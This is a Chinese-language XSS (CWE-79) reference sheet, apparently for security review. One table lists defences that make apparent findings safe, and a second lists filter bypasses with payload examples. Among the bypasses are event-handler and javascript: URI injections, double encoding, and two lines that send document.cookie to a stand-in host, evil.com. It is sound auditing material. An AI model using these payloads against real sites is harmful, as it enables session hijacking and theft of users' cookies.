# XSS (Cross-Site Scripting, CWE-79)

## 误判案例

| 防御手段 | 误判场景 | 为什么安全 |
|---|---|---|
| HTML 实体编码 | `StringEscapeUtils.escapeHtml4(input)` | `<` → `&lt;` / `"` → `&quot;`，HTML 上下文无法注入标签 |
| Content-Type: application/json | 响应是 JSON 非 HTML | 浏览器不会将 JSON 响应当作 HTML 渲染 |
| CSP script-src 'self' | 只允许同源脚本 | 内联 `<script>alert(1)</script>` 被 CSP 阻止 |
| CSP script-src nonce | `<script nonce="abc">` | 没有 nonce 的 script 标签被阻止 |
| HttpOnly Cookie | `response.setHeader("Set-Cookie", "sid=xxx; HttpOnly")` | JS 无法通过 `document.cookie` 读取 |
| 自动框架转义 | Thymeleaf `${input}` / Vue `{{input}}` / React `{input}` | 模板引擎默认 HTML 转义 |
| 输入在 JavaScript 字符串内且正确转义 | `var name = '<%= escapeJs(input) %>';` | JS 转义后引号和特殊字符被编码，无法逃逸字符串 |

## 绕过案例

| 看似防御 | 绕过思路 | 示例 |
|---|---|---|
| 只过滤 `<script>` | 使用其他事件属性 | `<img src=x onerror=alert(1)>` / `<svg onload=alert(1)>` |
| 过滤 `onXXX=` 事件 | JavaScript 伪协议 | `<a href="javascript:alert(1)">click</a>` |
| HTML 编码但输出在 JS 上下文 | HTML 编码不防 JS 注入 | `var name = 'user_input';` — `user_input` 含 `';alert(1);//` 逃逸字符串 |
| HTML 编码但输出在 URL 上下文 | `javascript:` 伪协议 | `<a href="user_input">` — `user_input=javascript:alert(1)` |
| CSP script-src 'self' | 上传 JS 文件到同源 | 上传 `.js` 文件到允许的上传目录 → `<script src="/uploads/evil.js">` |
| CSP script-src 'unsafe-inline' 禁止 | DOM Clobbering | 通过 DOM 元素覆盖全局变量干扰逻辑 |
| 过滤 `alert` / `prompt` | 不依赖这些函数 | `<img src=x onerror=fetch('http://evil.com?c='+document.cookie)>` |
| 服务端过滤 `<` / `>` | 输出在 JS 字符串中不需要标签 | `';document.location='http://evil.com?c='+document.cookie;//` |
| URL 编码输入 | 输出在 HTML 属性中浏览器会解码 | `" onmouseover="alert(1)` — 属性值解码后注入事件 |
| 双重编码 | WAF 解码一次，浏览器再解码 | `%253Cscript%253E` → `%3Cscript%3E` → `<script>` |
| SVG 文件上传 | SVG 内嵌 JS | `<svg onload=alert(document.cookie)>` — 浏览器直接渲染 SVG 中的 JS |
| 模板引擎 `v-html` / `{% raw %}` | 开发者手动关闭转义 | Vue `v-html="userInput"` / Jinja `{% raw %}{{ input }}{% endraw %}` — 绕过自动转义 |
